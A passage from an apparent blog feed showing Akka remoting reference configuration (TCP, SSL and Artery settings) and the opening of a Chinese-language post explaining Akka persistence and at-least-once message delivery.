default</span><br><span class="line">      write-buffer-low-water-mark = 0b</span><br><span class="line"></span><br><span class="line">      # Sets the send buffer size of the Sockets,</span><br><span class="line">      # set to 0b for platform default</span><br><span class="line">      send-buffer-size = 256000b</span><br><span class="line"></span><br><span class="line">      # Sets the receive buffer size of the Sockets,</span><br><span class="line">      # set to 0b for platform default</span><br><span class="line">      receive-buffer-size = 256000b</span><br><span class="line"></span><br><span class="line">      # Maximum message size the transport will accept, but at least</span><br><span class="line">      # 32000 bytes.</span><br><span class="line">      # Please note that UDP does not support arbitrary large datagrams,</span><br><span class="line">      # so this setting has to be chosen carefully when using UDP.</span><br><span class="line">      # Both send-buffer-size and receive-buffer-size settings has to</span><br><span class="line">      # be adjusted to be able to buffer messages of maximum size.</span><br><span class="line">      maximum-frame-size = 128000b</span><br><span class="line"></span><br><span class="line">      # Sets the size of the connection backlog</span><br><span class="line">      backlog = 4096</span><br><span class="line"></span><br><span class="line">      # Enables the TCP_NODELAY flag, i.e. disables Nagle’s algorithm</span><br><span class="line">      tcp-nodelay = on</span><br><span class="line"></span><br><span class="line">      # Enables TCP Keepalive, subject to the O/S kernel’s configuration</span><br><span class="line">      tcp-keepalive = on</span><br><span class="line"></span><br><span class="line">      # Enables SO_REUSEADDR, which determines when an ActorSystem can open</span><br><span class="line">      # the specified listen port (the meaning differs between *nix and Windows)</span><br><span class="line">      # Valid values are &quot;on&quot;, &quot;off&quot; and &quot;off-for-windows&quot;</span><br><span class="line">      # due to the following Windows bug: http://bugs.sun.com/bugdatabase/view_bug.do?bug_id=4476378</span><br><span class="line">      # &quot;off-for-windows&quot; of course means that it&#x27;s &quot;on&quot; for all other platforms</span><br><span class="line">      tcp-reuse-addr = off-for-windows</span><br><span class="line"></span><br><span class="line">      # Used to configure the number of I/O worker threads on server sockets</span><br><span class="line">      server-socket-worker-pool &#123;</span><br><span class="line">        # Min number of threads to cap factor-based number to</span><br><span class="line">        pool-size-min = 2</span><br><span class="line"></span><br><span class="line">        # The pool size factor is used to determine thread pool size</span><br><span class="line">        # using the following formula: ceil(available processors * factor).</span><br><span class="line">        # Resulting size is then bounded by the pool-size-min and</span><br><span class="line">        # pool-size-max values.</span><br><span class="line">        pool-size-factor = 1.0</span><br><span class="line"></span><br><span class="line">        # Max number of threads to cap factor-based number to</span><br><span class="line">        pool-size-max = 2</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      # Used to configure the number of I/O worker threads on client sockets</span><br><span class="line">      client-socket-worker-pool &#123;</span><br><span class="line">        # Min number of threads to cap factor-based number to</span><br><span class="line">        pool-size-min = 2</span><br><span class="line"></span><br><span class="line">        # The pool size factor is used to determine thread pool size</span><br><span class="line">        # using the following formula: ceil(available processors * factor).</span><br><span class="line">        # Resulting size is then bounded by the pool-size-min and</span><br><span class="line">        # pool-size-max values.</span><br><span class="line">        pool-size-factor = 1.0</span><br><span class="line"></span><br><span class="line">        # Max number of threads to cap factor-based number to</span><br><span class="line">        pool-size-max = 2</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    netty.udp = $&#123;akka.remote.netty.tcp&#125;</span><br><span class="line">    netty.udp &#123;</span><br><span class="line">      transport-protocol = udp</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    netty.ssl = $&#123;akka.remote.netty.tcp&#125;</span><br><span class="line">    netty.ssl = &#123;</span><br><span class="line">      # Enable SSL/TLS encryption.</span><br><span class="line">      # This must be enabled on both the client and server to work.</span><br><span class="line">      enable-ssl = true</span><br><span class="line"></span><br><span class="line">      security &#123;</span><br><span class="line">        # This is the Java Key Store used by the server connection</span><br><span class="line">        key-store = &quot;keystore&quot;</span><br><span class="line"></span><br><span class="line">        # This password is used for decrypting the key store</span><br><span class="line">        key-store-password = &quot;changeme&quot;</span><br><span class="line"></span><br><span class="line">        # This password is used for decrypting the key</span><br><span class="line">        key-password = &quot;changeme&quot;</span><br><span class="line"></span><br><span class="line">        # This is the Java Key Store used by the client connection</span><br><span class="line">        trust-store = &quot;truststore&quot;</span><br><span class="line"></span><br><span class="line">        # This password is used for decrypting the trust store</span><br><span class="line">        trust-store-password = &quot;changeme&quot;</span><br><span class="line"></span><br><span class="line">        # Protocol to use for SSL encryption, choose from:</span><br><span class="line">        # TLS 1.2 is available since JDK7, and default since JDK8:</span><br><span class="line">        # https://blogs.oracle.com/java-platform-group/entry/java_8_will_use_tls</span><br><span class="line">        protocol = &quot;TLSv1.2&quot;</span><br><span class="line"></span><br><span class="line">        # Example: [&quot;TLS_RSA_WITH_AES_128_CBC_SHA&quot;, &quot;TLS_RSA_WITH_AES_256_CBC_SHA&quot;]</span><br><span class="line">        # You need to install the JCE Unlimited Strength Jurisdiction Policy</span><br><span class="line">        # Files to use AES 256.</span><br><span class="line">        # More info here:</span><br><span class="line">        # http://docs.oracle.com/javase/7/docs/technotes/guides/security/SunProviders.html#SunJCEProvider</span><br><span class="line">        enabled-algorithms = [&quot;TLS_RSA_WITH_AES_128_CBC_SHA&quot;]</span><br><span class="line"></span><br><span class="line">        # There are three options, in increasing order of security:</span><br><span class="line">        # &quot;&quot; or SecureRandom =&gt; (default)</span><br><span class="line">        # &quot;SHA1PRNG&quot; =&gt; Can be slow because of blocking issues on Linux</span><br><span class="line">        # &quot;AES128CounterSecureRNG&quot; =&gt; fastest startup and based on AES encryption</span><br><span class="line">        # algorithm</span><br><span class="line">        # &quot;AES256CounterSecureRNG&quot;</span><br><span class="line">        #</span><br><span class="line">        # The following are deprecated in Akka 2.4. They use one of 3 possible</span><br><span class="line">        # seed sources, depending on availability: /dev/random, random.org and</span><br><span class="line">        # SecureRandom (provided by Java)</span><br><span class="line">        # &quot;AES128CounterInetRNG&quot;</span><br><span class="line">        # &quot;AES256CounterInetRNG&quot; (Install JCE Unlimited Strength Jurisdiction</span><br><span class="line">        # Policy Files first)</span><br><span class="line">        # Setting a value here may require you to supply the appropriate cipher</span><br><span class="line">        # suite (see enabled-algorithms section above)</span><br><span class="line">        random-number-generator = &quot;&quot;</span><br><span class="line"></span><br><span class="line">        # Require mutual authentication between TLS peers</span><br><span class="line">        #</span><br><span class="line">        # Without mutual authentication only the peer that actively establishes a connection (TLS client side)</span><br><span class="line">        # checks if the passive side (TLS server side) sends over a trusted certificate. With the flag turned on,</span><br><span class="line">        # the passive side will also request and verify a certificate from the connecting peer.</span><br><span class="line">        #</span><br><span class="line">        # To prevent man-in-the-middle attacks you should enable this setting. For compatibility reasons it is</span><br><span class="line">        # still set to &#x27;off&#x27; per default.</span><br><span class="line">        #</span><br><span class="line">        # Note: Nodes that are configured with this setting to &#x27;on&#x27; might not be able to receive messages from nodes that</span><br><span class="line">        # run on older versions of akka-remote. This is because in older versions of Akka the active side of the remoting</span><br><span class="line">        # connection will not send over certificates.</span><br><span class="line">        #</span><br><span class="line">        # However, starting from the version this setting was added, even with this setting &quot;off&quot;, the active side</span><br><span class="line">        # (TLS client side) will use the given key-store to send over a certificate if asked. A rolling upgrades from</span><br><span class="line">        # older versions of Akka can therefore work like this:</span><br><span class="line">        #   - upgrade all nodes to an Akka version supporting this flag, keeping it off</span><br><span class="line">        #   - then switch the flag on and do again a rolling upgrade of all nodes</span><br><span class="line">        # The first step ensures that all nodes will send over a certificate when asked to. The second</span><br><span class="line">        # step will ensure that all nodes finally enforce the secure checking of client certificates.</span><br><span class="line">        require-mutual-authentication = off</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ### Default configuration for the failure injector transport adapter</span><br><span class="line"></span><br><span class="line">    gremlin &#123;</span><br><span class="line">      # Enable debug logging of the failure injector transport adapter</span><br><span class="line">      debug = off</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ### Default dispatcher for the remoting subsystem</span><br><span class="line"></span><br><span class="line">    default-remote-dispatcher &#123;</span><br><span class="line">      type = Dispatcher</span><br><span class="line">      executor = &quot;fork-join-executor&quot;</span><br><span class="line">      fork-join-executor &#123;</span><br><span class="line">        parallelism-min = 2</span><br><span class="line">        parallelism-factor = 0.5</span><br><span class="line">        parallelism-max = 16</span><br><span class="line">      &#125;</span><br><span class="line">      throughput = 10</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    backoff-remote-dispatcher &#123;</span><br><span class="line">      type = Dispatcher</span><br><span class="line">      executor = &quot;fork-join-executor&quot;</span><br><span class="line">      fork-join-executor &#123;</span><br><span class="line">        # Min number of threads to cap factor-based parallelism number to</span><br><span class="line">        parallelism-min = 2</span><br><span class="line">        parallelism-max = 2</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">#//#classic</span><br><span class="line"></span><br><span class="line">akka &#123;</span><br><span class="line"></span><br><span class="line">  remote &#123;</span><br><span class="line">  #//#artery</span><br><span class="line"></span><br><span class="line">    ### Configuration for Artery, the reimplementation of remoting</span><br><span class="line">    artery &#123;</span><br><span class="line"></span><br><span class="line">      # Enable the new remoting with this flag</span><br><span class="line">      enabled = off</span><br><span class="line"></span><br><span class="line">      # Canonical address is the address other clients should connect to.</span><br><span class="line">      # Artery transport will expect messages to this address.</span><br><span class="line">      canonical &#123;</span><br><span class="line"></span><br><span class="line">        # The default remote server port clients should connect to.</span><br><span class="line">        # Default is 25520, use 0 if you want a random available port</span><br><span class="line">        # This port needs to be unique for each actor system on the same machine.</span><br><span class="line">        port = 25520</span><br><span class="line"></span><br><span class="line">        # Hostname clients should connect to. Can be set to an ip, hostname</span><br><span class="line">        # or one of the following special values:</span><br><span class="line">        #   &quot;&lt;getHostAddress&gt;&quot;   InetAddress.getLocalHost.getHostAddress</span><br><span class="line">        #   &quot;&lt;getHostName&gt;&quot;      InetAddress.getLocalHost.getHostName</span><br><span class="line">        #</span><br><span class="line">        hostname = &quot;&lt;getHostAddress&gt;&quot;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      # Use these settings to bind a network interface to a different address</span><br><span class="line">      # than artery expects messages at. This may be used when running Akka</span><br><span class="line">      # nodes in a separated networks (under NATs or in containers). If canonical</span><br><span class="line">      # and bind addresses are different, then network configuration that relays</span><br><span class="line">      # communications from canonical to bind addresses is expected.</span><br><span class="line">      bind &#123;</span><br><span class="line"></span><br><span class="line">        # Port to bind a network interface to. Can be set to a port number</span><br><span class="line">        # of one of the following special values:</span><br><span class="line">        #   0    random available port</span><br><span class="line">        #   &quot;&quot;   akka.remote.artery.canonical.port</span><br><span class="line">        #</span><br><span class="line">        port = &quot;&quot;</span><br><span class="line"></span><br><span class="line">        # Hostname to bind a network interface to. Can be set to an ip, hostname</span><br><span class="line">        # or one of the following special values:</span><br><span class="line">        #   &quot;0.0.0.0&quot;            all interfaces</span><br><span class="line">        #   &quot;&quot;                   akka.remote.artery.canonical.hostname</span><br><span class="line">        #   &quot;&lt;getHostAddress&gt;&quot;   InetAddress.getLocalHost.getHostAddress</span><br><span class="line">        #   &quot;&lt;getHostName&gt;&quot;      InetAddress.getLocalHost.getHostName</span><br><span class="line">        #</span><br><span class="line">        hostname = &quot;&quot;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      # Actor paths to use the large message stream for when a message</span><br><span class="line">      # is sent to them over remoting. The large message stream dedicated</span><br><span class="line">      # is separate from &quot;normal&quot; and system messages so that sending a</span><br><span class="line">      # large message does not interfere with them.</span><br><span class="line">      # Entries should be the full path to the actor. Wildcards in the form of &quot;*&quot;</span><br><span class="line">      # can be supplied at any place and matches any name at that segment -</span><br><span class="line">      # &quot;/user/supervisor/actor/*&quot; will match any direct child to actor,</span><br><span class="line">      # while &quot;/supervisor/*/child&quot; will match any grandchild to &quot;supervisor&quot; that</span><br><span class="line">      # has the name &quot;child&quot;</span><br><span class="line">      # Messages sent to ActorSelections will not be passed through the large message</span><br><span class="line">      # stream, to pass such messages through the large message stream the selections</span><br><span class="line">      # but must be resolved to ActorRefs first.</span><br><span class="line">      large-message-destinations = []</span><br><span class="line"></span><br><span class="line">      # Enable untrusted mode, which discards inbound system messages, PossiblyHarmful and</span><br><span class="line">      # ActorSelection messages. E.g. remote watch and remote deployment will not work.</span><br><span class="line">      # ActorSelection messages can be enabled for specific paths with the trusted-selection-paths</span><br><span class="line">      untrusted-mode = off</span><br><span class="line"></span><br><span class="line">      # When &#x27;untrusted-mode=on&#x27; inbound actor selections are by default discarded.</span><br><span class="line">      # Actors with paths defined in this white list are granted permission to receive actor</span><br><span class="line">      # selections messages.</span><br><span class="line">      # E.g. trusted-selection-paths = [&quot;/user/receptionist&quot;, &quot;/user/namingService&quot;]</span><br><span class="line">      trusted-selection-paths = []</span><br><span class="line"></span><br><span class="line">      # If this is &quot;on&quot;, all inbound remote messages will be logged at DEBUG level,</span><br><span class="line">      # if off then they are not logged</span><br><span class="line">      log-received-messages = off</span><br><span class="line"></span><br><span class="line">      # If this is &quot;on&quot;, all outbound remote messages will be logged at DEBUG level,</span><br><span class="line">      # if off then they are not logged</span><br><span class="line">      log-sent-messages = off</span><br><span class="line"></span><br><span class="line">      advanced &#123;</span><br><span class="line"></span><br><span class="line">        # Maximum serialized message size, including header data.</span><br><span class="line">        maximum-frame-size = 256 KiB</span><br><span class="line"></span><br><span class="line">        # Direct byte buffers are reused in a pool with this maximum size.</span><br><span class="line">        # Each buffer has the size of &#x27;maximum-frame-size&#x27;.</span><br><span class="line">        # This is not a hard upper limit on number of created buffers. Additional</span><br><span class="line">        # buffers will be created if needed, e.g. when using many outbound</span><br><span class="line">        # associations at the same time. Such additional buffers will be garbage</span><br><span class="line">        # collected, which is not as efficient as reusing buffers in the pool.</span><br><span class="line">        buffer-pool-size = 128</span><br><span class="line"></span><br><span class="line">        # Maximum serialized message size for the large messages, including header data.</span><br><span class="line">        # See &#x27;large-message-destinations&#x27;.</span><br><span class="line">        maximum-large-frame-size = 2 MiB</span><br><span class="line"></span><br><span class="line">        # Direct byte buffers for the large messages are reused in a pool with this maximum size.</span><br><span class="line">        # Each buffer has the size of &#x27;maximum-large-frame-size&#x27;.</span><br><span class="line">        # See &#x27;large-message-destinations&#x27;.</span><br><span class="line">        # This is not a hard upper limit on number of created buffers. Additional</span><br><span class="line">        # buffers will be created if needed, e.g. when using many outbound</span><br><span class="line">        # associations at the same time. Such additional buffers will be garbage</span><br><span class="line">        # collected, which is not as efficient as reusing buffers in the pool.</span><br><span class="line">        large-buffer-pool-size = 32</span><br><span class="line"></span><br><span class="line">        # For enabling testing features, such as blackhole in akka-remote-testkit.</span><br><span class="line">        test-mode = off</span><br><span class="line"></span><br><span class="line">        # Settings for the materializer that is used for the remote streams.</span><br><span class="line">        materializer = $&#123;akka.stream.materializer&#125;</span><br><span class="line"></span><br><span class="line">        # If set to a nonempty string artery will use the given dispatcher for</span><br><span class="line">        # the ordinary and large message streams, otherwise the default dispatcher is used.</span><br><span class="line">        use-dispatcher = &quot;akka.remote.default-remote-dispatcher&quot;</span><br><span class="line"></span><br><span class="line">        # If set to a nonempty string remoting will use the given dispatcher for</span><br><span class="line">        # the control stream, otherwise the default dispatcher is used.</span><br><span class="line">        # It can be good to not use the same dispatcher for the control stream as</span><br><span class="line">        # the dispatcher for the ordinary message stream so that heartbeat messages</span><br><span class="line">        # are not disturbed.</span><br><span class="line">        use-control-stream-dispatcher = &quot;&quot;</span><br><span class="line"></span><br><span class="line">        # Controls whether to start the Aeron media driver in the same JVM or use external</span><br><span class="line">        # process. Set to &#x27;off&#x27; when using external media driver, and then also set the</span><br><span class="line">        # &#x27;aeron-dir&#x27;.</span><br><span class="line">        embedded-media-driver = on</span><br><span class="line"></span><br><span class="line">        # Directory used by the Aeron media driver. It&#x27;s mandatory to define the &#x27;aeron-dir&#x27;</span><br><span class="line">        # if using external media driver, i.e. when &#x27;embedded-media-driver = off&#x27;.</span><br><span class="line">        # Embedded media driver will use a this directory, or a temporary directory if this</span><br><span class="line">        # property is not defined (empty).</span><br><span class="line">        aeron-dir = &quot;&quot;</span><br><span class="line"></span><br><span class="line">        # Whether to delete aeron embeded driver directory upon driver stop.</span><br><span class="line">        delete-aeron-dir = yes</span><br><span class="line"></span><br><span class="line">        # Level of CPU time used, on a scale between 1 and 10, during backoff/idle.</span><br><span class="line">        # The tradeoff is that to have low latency more CPU time must be used to be</span><br><span class="line">        # able to react quickly on incoming messages or send as fast as possible after</span><br><span class="line">        # backoff backpressure.</span><br><span class="line">        # Level 1 strongly prefer low CPU consumption over low latency.</span><br><span class="line">        # Level 10 strongly prefer low latency over low CPU consumption.</span><br><span class="line">        idle-cpu-level = 5</span><br><span class="line"></span><br><span class="line">        # WARNING: This feature is not supported yet. Don&#x27;t use other value than 1.</span><br><span class="line">        # It requires more hardening and performance optimizations.</span><br><span class="line">        # Number of outbound lanes for each outbound association. A value greater than 1</span><br><span class="line">        # means that serialization can be performed in parallel for different destination</span><br><span class="line">        # actors. The selection of lane is based on consistent hashing of the recipient</span><br><span class="line">        # ActorRef to preserve message ordering per receiver.</span><br><span class="line">        outbound-lanes = 1</span><br><span class="line"></span><br><span class="line">        # WARNING: This feature is not supported yet. Don&#x27;t use other value than 1.</span><br><span class="line">        # It requires more hardening and performance optimizations.</span><br><span class="line">        # Total number of inbound lanes, shared among all inbound associations. A value</span><br><span class="line">        # greater than 1 means that deserialization can be performed in parallel for</span><br><span class="line">        # different destination actors. The selection of lane is based on consistent</span><br><span class="line">        # hashing of the recipient ActorRef to preserve message ordering per receiver.</span><br><span class="line">        inbound-lanes = 1</span><br><span class="line"></span><br><span class="line">        # Size of the send queue for outgoing messages. Messages will be dropped if</span><br><span class="line">        # the queue becomes full. This may happen if you send a burst of many messages</span><br><span class="line">        # without end-to-end flow control. Note that there is one such queue per</span><br><span class="line">        # outbound association. The trade-off of using a larger queue size is that</span><br><span class="line">        # it consumes more memory, since the queue is based on preallocated array with</span><br><span class="line">        # fixed size.</span><br><span class="line">        outbound-message-queue-size = 3072</span><br><span class="line"></span><br><span class="line">        # Size of the send queue for outgoing control messages, such as system messages.</span><br><span class="line">        # If this limit is reached the remote system is declared to be dead and its UID</span><br><span class="line">        # marked as quarantined.</span><br><span class="line">        # The trade-off of using a larger queue size is that it consumes more memory,</span><br><span class="line">        # since the queue is based on preallocated array with fixed size.</span><br><span class="line">        outbound-control-queue-size = 3072</span><br><span class="line"></span><br><span class="line">        # Size of the send queue for outgoing large messages. Messages will be dropped if</span><br><span class="line">        # the queue becomes full. This may happen if you send a burst of many messages</span><br><span class="line">        # without end-to-end flow control. Note that there is one such queue per</span><br><span class="line">        # outbound association. The trade-off of using a larger queue size is that</span><br><span class="line">        # it consumes more memory, since the queue is based on preallocated array with</span><br><span class="line">        # fixed size.</span><br><span class="line">        outbound-large-message-queue-size = 256</span><br><span class="line"></span><br><span class="line">        # This setting defines the maximum number of unacknowledged system messages</span><br><span class="line">        # allowed for a remote system. If this limit is reached the remote system is</span><br><span class="line">        # declared to be dead and its UID marked as quarantined.</span><br><span class="line">        system-message-buffer-size = 20000</span><br><span class="line"></span><br><span class="line">        # unacknowledged system messages are re-delivered with this interval</span><br><span class="line">        system-message-resend-interval = 1 second</span><br><span class="line"></span><br><span class="line">        # The timeout for outbound associations to perform the handshake.</span><br><span class="line">        # This timeout must be greater than the &#x27;image-liveness-timeout&#x27;.</span><br><span class="line">        handshake-timeout = 20 s</span><br><span class="line"></span><br><span class="line">        # incomplete handshake attempt is retried with this interval</span><br><span class="line">        handshake-retry-interval = 1 second</span><br><span class="line"></span><br><span class="line">        # handshake requests are performed periodically with this interval,</span><br><span class="line">        # also after the handshake has been completed to be able to establish</span><br><span class="line">        # a new session with a restarted destination system</span><br><span class="line">        inject-handshake-interval = 1 second</span><br><span class="line"></span><br><span class="line">        # messages that are not accepted by Aeron are dropped after retrying for this period</span><br><span class="line">        give-up-message-after = 60 seconds</span><br><span class="line"></span><br><span class="line">        # System messages that are not acknowledged after re-sending for this period are</span><br><span class="line">        # dropped and will trigger quarantine. The value should be longer than the length</span><br><span class="line">        # of a network partition that you need to survive.</span><br><span class="line">        give-up-system-message-after = 6 hours</span><br><span class="line"></span><br><span class="line">        # during ActorSystem termination the remoting will wait this long for</span><br><span class="line">        # an acknowledgment by the destination system that flushing of outstanding</span><br><span class="line">        # remote messages has been completed</span><br><span class="line">        shutdown-flush-timeout = 1 second</span><br><span class="line"></span><br><span class="line">        # See &#x27;inbound-max-restarts&#x27;</span><br><span class="line">        inbound-restart-timeout = 5 seconds</span><br><span class="line"></span><br><span class="line">        # Max number of restarts within &#x27;inbound-restart-timeout&#x27; for the inbound streams.</span><br><span class="line">        # If more restarts occurs the ActorSystem will be terminated.</span><br><span class="line">        inbound-max-restarts = 5</span><br><span class="line"></span><br><span class="line">        # See &#x27;outbound-max-restarts&#x27;</span><br><span class="line">        outbound-restart-timeout = 5 seconds</span><br><span class="line"></span><br><span class="line">        # Max number of restarts within &#x27;outbound-restart-timeout&#x27; for the outbound streams.</span><br><span class="line">        # If more restarts occurs the ActorSystem will be terminated.</span><br><span class="line">        outbound-max-restarts = 5</span><br><span class="line"></span><br><span class="line">        # Stop outbound stream of a quarantined association after this idle timeout, i.e.</span><br><span class="line">        # when not used any more.</span><br><span class="line">        stop-quarantined-after-idle = 3 seconds</span><br><span class="line"></span><br><span class="line">        # Timeout after which aeron driver has not had keepalive messages</span><br><span class="line">        # from a client before it considers the client dead.</span><br><span class="line">        client-liveness-timeout = 20 seconds</span><br><span class="line"></span><br><span class="line">        # Timeout for each the INACTIVE and LINGER stages an aeron image</span><br><span class="line">        # will be retained for when it is no longer referenced.</span><br><span class="line">        # This timeout must be less than the &#x27;handshake-timeout&#x27;.</span><br><span class="line">        image-liveness-timeout = 10 seconds</span><br><span class="line"></span><br><span class="line">        # Timeout after which the aeron driver is considered dead</span><br><span class="line">        # if it does not update its C&#x27;n&#x27;C timestamp.</span><br><span class="line">        driver-timeout = 20 seconds</span><br><span class="line"></span><br><span class="line">        flight-recorder &#123;</span><br><span class="line">          // FIXME it should be enabled by default when we have a good solution for naming the files</span><br><span class="line">          enabled = off</span><br><span class="line">          # Controls where the flight recorder file will be written. There are three options:</span><br><span class="line">          # 1. Empty: a file will be generated in the temporary directory of the OS</span><br><span class="line">          # 2. A relative or absolute path ending with &quot;.afr&quot;: this file will be used</span><br><span class="line">          # 3. A relative or absolute path: this directory will be used, the file will get a random file name</span><br><span class="line">          destination = &quot;&quot;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # compression of common strings in remoting messages, like actor destinations, serializers etc</span><br><span class="line">        compression &#123;</span><br><span class="line"></span><br><span class="line">          actor-refs &#123;</span><br><span class="line">            # Max number of compressed actor-refs</span><br><span class="line">            # Note that compression tables are &quot;rolling&quot; (i.e. a new table replaces the old</span><br><span class="line">            # compression table once in a while), and this setting is only about the total number</span><br><span class="line">            # of compressions within a single such table.</span><br><span class="line">            # Must be a positive natural number.</span><br><span class="line">            max = 256</span><br><span class="line"></span><br><span class="line">            # interval between new table compression advertisements.</span><br><span class="line">            # this means the time during which we collect heavy-hitter data and then turn it into a compression table.</span><br><span class="line">            advertisement-interval = 1 minute </span><br><span class="line">          &#125;</span><br><span class="line">          manifests &#123;</span><br><span class="line">            # Max number of compressed manifests</span><br><span class="line">            # Note that compression tables are &quot;rolling&quot; (i.e. a new table replaces the old</span><br><span class="line">            # compression table once in a while), and this setting is only about the total number</span><br><span class="line">            # of compressions within a single such table.</span><br><span class="line">            # Must be a positive natural number.</span><br><span class="line">            max = 256</span><br><span class="line"></span><br><span class="line">            # interval between new table compression advertisements.</span><br><span class="line">            # this means the time during which we collect heavy-hitter data and then turn it into a compression table.</span><br><span class="line">            advertisement-interval = 1 minute</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # List of fully qualified class names of remote instruments which should</span><br><span class="line">        # be initialized and used for monitoring of remote messages.</span><br><span class="line">        # The class must extend akka.remote.artery.RemoteInstrument and</span><br><span class="line">        # have a public constructor with empty parameters or one ExtendedActorSystem</span><br><span class="line">        # parameter.</span><br><span class="line">        # A new instance of RemoteInstrument will be created for each encoder and decoder.</span><br><span class="line">        # It&#x27;s only called from the stage, so if it dosn&#x27;t delegate to any shared instance</span><br><span class="line">        # it doesn&#x27;t have to be thread-safe.</span><br><span class="line">        # Refer to `akka.remote.artery.RemoteInstrument` for more information.</span><br><span class="line">        instruments = $&#123;?akka.remote.artery.advanced.instruments&#125; []</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">#//#artery</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span c</summary>
      
    
    
    
    <category term="network" scheme="https://wuhaocn.github.io/categories/network/"/>
    
    
    <category term="akka" scheme="https://wuhaocn.github.io/tags/akka/"/>
    
  </entry>
  
  <entry>
    <title>Akka-持久化-消息发送与接收</title>
    <link href="https://wuhaocn.github.io/2021/12/03/network/akka/Akka-%E6%8C%81%E4%B9%85%E5%8C%96-%E6%B6%88%E6%81%AF%E5%8F%91%E9%80%81%E4%B8%8E%E6%8E%A5%E6%94%B6/"/>
    <id>https://wuhaocn.github.io/2021/12/03/network/akka/Akka-%E6%8C%81%E4%B9%85%E5%8C%96-%E6%B6%88%E6%81%AF%E5%8F%91%E9%80%81%E4%B8%8E%E6%8E%A5%E6%94%B6/</id>
    <published>2021-12-03T08:23:51.202Z</published>
    <updated>2021-12-03T08:41:18.473Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h2><pre><code>  在《使用Akka持久化——持久化与快照》一文中介绍了如何使用Akka持久化消息及生成快照。对于集群应用来说，发送者发出消息，只有当收到了接受者的成功回复才应当认为是一次完整的请求和应答（一些RPC框架只提供了远程调用、序列化/反序列化的机制，但是具体调用的成功与否实际是抛给了开发者本人），利用Akka的应答机制很容易实现这些功能。特殊情况下发送者发送了消息，但是最终接受者却没有接收到消息，导致这一情况发生的因素很多（例如：发送者调用完发送接口后，发送者所在进程奔溃了；网络故障；接收者不存在等）。如果这些消息的成功接收与处理对于整个应用而言具有强一致性的要求，那么这些都会导致很多困扰，好在我们可以使用Akka的持久化机制。</code></pre><p>​</p><p> 发送者在发送消息之前先对消息进行持久化，那么无论任何原因导致没有收到接收者的成功回复时，我们总能有办法从持久化信息中找出那些未被成功回复的消息进行重发（这说明接收者接到的消息有可能会重复，此时需要保证接收者的实现是冥等的）。当接收者收到消息进行处理后需要向发送者发送成功回复，发送者收到回复后的第一个动作应当是对回复内容的持久化，否则有可能在还未真正对成功回复处理时宕机或进程奔溃导致回复消息丢失（在持久化与收到消息之间仍然会存在宕机和进程奔溃的情况，只不过这个时间非常短，因此丢失回复的可能会很低），当持久化回复消息完成后，可以自己慢慢来处理这些确认信息，而不用担心它们丢失了。<br>​</p><p> 本文将根据Akka官网的例子，对其做一些适应性改造后，向大家展示Akka持久化的另一个强大武器——At least once delivery！<br><a href="https://blog.csdn.net/beliefer/article/details/53929751"></a></p><h2 id="2-消息投递规则"><a href="#2-消息投递规则" class="headerlink" title="2.消息投递规则"></a>2.消息投递规则</h2><p> 一般而言，消息投递有下面三种情况：</p><ul><li><p>at-most-once 意味着每条应用了这种机制的消息会被投递0次或1次。可以说这条消息可能会丢失。</p></li><li><p>at-least-once 意味着每条应用了这种机制的消息潜在的存在多次投递尝试并保证至少会成功一次。就是说这条消息可能会重复但是不会丢失。</p></li><li><p>exactly-once 意味着每条应用了这种机制的消息只会向接收者准确的发送一次。换言之，这种消息既不会丢失也不会重复。</p><pre><code>at-most-once的成本最低且性能最高，因为它在发送完消息后不会尝试去记录任何状态，然后这条消息将被他抛之脑后。at-least-once需要发送者必须认识它所发送过的消息，并对没有收到回复的消息进行发送重试。exactly-once的成本是三者中最高的而且性能却又是三者中最差的，它除了要求发送者有记忆和重试能力，还要求接收者能够认识接收过的消息并能过滤出那些重复的消息投递。Akka的Actor模型一般提供的消息都属于at-most-once，那是因为大多数场景都不需要有状态的消息投递，例如web服务器请求。当你有强一致性需求时，才应该启用Akka的at-least-once机制，那就是你的Actor不再继承自UntypedActor，而是继承自UntypedPersistentActorWithAtLeastOnceDelivery。</code></pre><h2 id="3-配置"><a href="#3-配置" class="headerlink" title="3.配置"></a>3.配置</h2><p>如果要使用，那么需要在中增加以下的一些配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">at-least-once-delivery &#123;</span><br><span class="line">  redeliver-interval = 20000</span><br><span class="line">  redelivery-burst-limit = 100</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> redeliver-interval用于配置重新进行投递尝试的时间间隔，单位是毫秒。redelivery-burst-limit用于配置每次重新执行投递尝试时发送的最大消息条数。<br>​</p></li></ul><h2 id="4-一致性消息例子"><a href="#4-一致性消息例子" class="headerlink" title="4.一致性消息例子"></a>4.一致性消息例子</h2><p> 